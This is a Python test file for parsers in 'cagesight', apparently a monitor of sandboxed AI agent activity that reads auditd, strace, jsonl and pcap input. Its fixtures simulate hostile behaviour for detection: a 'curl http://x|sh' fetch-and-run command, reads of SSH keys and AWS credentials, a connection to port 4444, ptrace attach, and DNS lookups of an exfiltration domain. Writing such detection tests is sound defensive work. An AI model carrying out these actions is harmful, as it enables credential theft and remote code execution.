"""Parser tests: auditd, strace, jsonl, pcap sniffing."""

from __future__ import annotations

import os
import struct
import sys
import tempfile
import unittest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from cagesight.parsers import auditd, detect_input_type, jsonl, pcap, strace  # noqa: E402
from tests.helpers import build_pcap, dns_query, ethernet, ipv4, udp  # noqa: E402

AUDITD_OPEN = [
    'type=SYSCALL msg=audit(1794182400.100:100): arch=c000003e syscall=257 success=yes exit=3 '
    "a0=ffffff9c a1=55e0 a2=0 a3=0 items=1 ppid=1 pid=4242 auid=1000 uid=1000 gid=1000 "
    'euid=1000 comm="python3" exe="/usr/bin/python3" key="test"',
    'type=PATH msg=audit(1794182400.100:100): item=0 name="/home/agent/.ssh/id_rsa" '
    "inode=123 nametype=NORMAL",
]

AUDITD_CONNECT = [
    'type=SYSCALL msg=audit(1794182400.200:101): arch=c000003e syscall=42 success=yes exit=0 '
    "a0=3 a1=0 a2=16 a3=0 items=0 ppid=1 pid=4242 uid=1000 comm=\"python3\"",
    "type=SOCKADDR msg=audit(1794182400.200:101): saddr=0200115C2D4D0C09",
]

AUDITD_CONNECT_INTERPRETED = [
    'type=SYSCALL msg=audit(1794182400.200:102): arch=c000003e syscall=42 success=yes exit=0 '
    "a0=3 a1=0 a2=16 a3=0 items=0 ppid=1 pid=4242 uid=1000 comm=\"python3\"",
    "type=SOCKADDR msg=audit(1794182400.200:102): saddr=45.77.12.9:4444",
]

AUDITD_EXEC = [
    'type=SYSCALL msg=audit(1794182400.300:102): arch=c000003e syscall=59 success=yes exit=0 '
    "a0=0 a1=0 a2=0 a3=0 items=2 ppid=1 pid=4242 uid=1000 comm=\"sh\" exe=\"/usr/bin/sh\"",
    'type=EXECVE msg=audit(1794182400.300:102): argc=3 a0="sh" a1="-c" a2="id"',
]

STRACE_LINES = [
    '1794182400.100000 execve("/bin/sh", ["sh", "-c", "curl http://x|sh"], 0x7ffd) = 0',
    '1794182400.200000 openat(AT_FDCWD, "/home/agent/.aws/credentials", O_RDONLY) = 3',
    '1794182400.300000 connect(3, {sa_family=AF_INET, sin_port=htons(4444), '
    'sin_addr=inet_addr("45.77.12.9")}, 16) = 0',
    "1794182400.400000 ptrace(PTRACE_ATTACH, 1, NULL, NULL) = 0",
]


class AuditdTest(unittest.TestCase):
    def test_openat_path(self):
        events = auditd.parse_lines(AUDITD_OPEN)
        self.assertEqual(len(events), 1)
        self.assertEqual(events[0].kind, "file")
        self.assertEqual(events[0].path, "/home/agent/.ssh/id_rsa")
        self.assertEqual(events[0].pid, 4242)

    def test_connect_sockaddr(self):
        events = auditd.parse_lines(AUDITD_CONNECT)
        self.assertEqual(events[0].kind, "net")
        self.assertEqual(events[0].dst_ip, "45.77.12.9")
        self.assertEqual(events[0].dst_port, 4444)

    def test_execve_argv(self):
        events = auditd.parse_lines(AUDITD_EXEC)
        self.assertEqual(events[0].kind, "exec")
        self.assertEqual(events[0].argv, ("sh", "-c", "id"))

    def test_connect_interpreted_sockaddr(self):
        # ausearch -i 会把 saddr 解释成可读地址，而不是十六进制
        events = auditd.parse_lines(AUDITD_CONNECT_INTERPRETED)
        self.assertEqual(events[0].dst_ip, "45.77.12.9")
        self.assertEqual(events[0].dst_port, 4444)


class StraceTest(unittest.TestCase):
    def test_syscalls(self):
        events = strace.parse_lines(STRACE_LINES)
        self.assertEqual(len(events), 4)
        self.assertEqual(events[0].kind, "exec")
        self.assertEqual(events[0].argv, ("sh", "-c", "curl http://x|sh"))
        self.assertEqual(events[1].path, "/home/agent/.aws/credentials")
        self.assertEqual(events[2].dst_ip, "45.77.12.9")
        self.assertEqual(events[2].dst_port, 4444)
        self.assertEqual(events[3].extra.get("request_name"), "PTRACE_ATTACH")

    def test_truncated_line_is_ignored(self):
        events = strace.parse_lines(['1794182400.200000 execve("/bin/sh", ["sh", "-c", "echo hi'])
        self.assertEqual(events, [])


class PcapFormatTest(unittest.TestCase):
    def _parse(self, blob: bytes):
        handle = tempfile.NamedTemporaryFile(delete=False, suffix=".pcap")
        try:
            handle.write(blob)
            handle.close()
            return pcap.parse_pcap(handle.name)
        finally:
            os.unlink(handle.name)

    @staticmethod
    def _dns_frame() -> bytes:
        return ethernet(ipv4("172.17.0.2", "8.8.8.8", 17, udp(53000, 53, dns_query(1, "abc.exfil-c2.net"))))

    def test_nanosecond_timestamp(self):
        frame = self._dns_frame()
        blob = struct.pack("<IHHIIII", 0xA1B23C4D, 2, 4, 0, 0, 65535, 1)
        blob += struct.pack("<IIII", 1700000000, 500000000, len(frame), len(frame)) + frame
        events = self._parse(blob)
        self.assertEqual(len(events), 1)
        self.assertAlmostEqual(events[0].ts, 1700000000.5, places=3)

    def test_loopback_linktype(self):
        payload = struct.pack("<I", 2) + ipv4(
            "172.17.0.2", "8.8.8.8", 17, udp(53000, 53, dns_query(1, "abc.exfil-c2.net"))
        )
        blob = struct.pack("<IHHIIII", 0xA1B2C3D4, 2, 4, 0, 0, 65535, 0)
        blob += struct.pack("<IIII", 1794182400, 0, len(payload), len(payload)) + payload
        events = self._parse(blob)
        self.assertEqual(len(events), 1)
        self.assertEqual(events[0].domain, "abc.exfil-c2.net")

    def test_vlan_tagged_frame(self):
        ip = ipv4("172.17.0.2", "8.8.8.8", 17, udp(53000, 53, dns_query(1, "abc.exfil-c2.net")))
        frame = (
            bytes.fromhex("0242ac110002")
            + bytes.fromhex("0242ac110001")
            + struct.pack(">HHH", 0x8100, 1, 0x0800)
            + ip
        )
        blob = struct.pack("<IHHIIII", 0xA1B2C3D4, 2, 4, 0, 0, 65535, 1)
        blob += struct.pack("<IIII", 1794182400, 0, len(frame), len(frame)) + frame
        events = self._parse(blob)
        self.assertEqual(len(events), 1)
        self.assertEqual(events[0].domain, "abc.exfil-c2.net")


class DetectionTest(unittest.TestCase):
    def test_detect_types(self):
        with tempfile.TemporaryDirectory() as directory:
            audit_path = os.path.join(directory, "audit.log")
            with open(audit_path, "w", encoding="utf-8") as handle:
                handle.write("\n".join(AUDITD_OPEN))
            self.assertEqual(detect_input_type(audit_path), "auditd")

            strace_path = os.path.join(directory, "agent.strace")
            with open(strace_path, "w", encoding="utf-8") as handle:
                handle.write("\n".join(STRACE_LINES))
            self.assertEqual(detect_input_type(strace_path), "strace")

            jsonl_path = os.path.join(directory, "events.jsonl")
            with open(jsonl_path, "w", encoding="utf-8") as handle:
                handle.write('{"kind": "file", "path": "/x"}\n')
            self.assertEqual(detect_input_type(jsonl_path), "jsonl")

            pcap_path = os.path.join(directory, "traffic.pcap")
            frame = ethernet(ipv4("10.0.0.2", "8.8.8.8", 17, udp(5000, 53, dns_query(1, "a.com"))))
            with open(pcap_path, "wb") as handle:
                handle.write(build_pcap([frame]))
            self.assertEqual(detect_input_type(pcap_path), "pcap")

    def test_jsonl_multiline(self):
        with tempfile.TemporaryDirectory() as directory:
            path = os.path.join(directory, "events.jsonl")
            with open(path, "w", encoding="utf-8") as handle:
                handle.write('{"kind": "file",\n "path": "/home/agent/.ssh/id_rsa"}\n')
            events = jsonl.parse_file(path)
            self.assertEqual(len(events), 1)
            self.assertEqual(events[0].path, "/home/agent/.ssh/id_rsa")

    def test_garbage_jsonl_is_bounded(self):
        # 畸形输入不能无限拼接缓冲区（否则构成内存/时间 DoS）。
        events = jsonl.parse_lines(["x" * 40] * 50000)
        self.assertEqual(events, [])

    def test_utf8_bom_jsonl(self):
        # Windows 记事本/Excel 导出的文件常带 BOM
        with tempfile.TemporaryDirectory() as directory:
            path = os.path.join(directory, "bom.jsonl")
            with open(path, "w", encoding="utf-8-sig") as handle:
                handle.write('{"ts": 1794182400, "kind": "file", "path": "/home/agent/.ssh/id_rsa"}\n')
            events = jsonl.parse_file(path)
            self.assertEqual(len(events), 1)
            self.assertEqual(events[0].path, "/home/agent/.ssh/id_rsa")


if __name__ == "__main__":
    unittest.main()
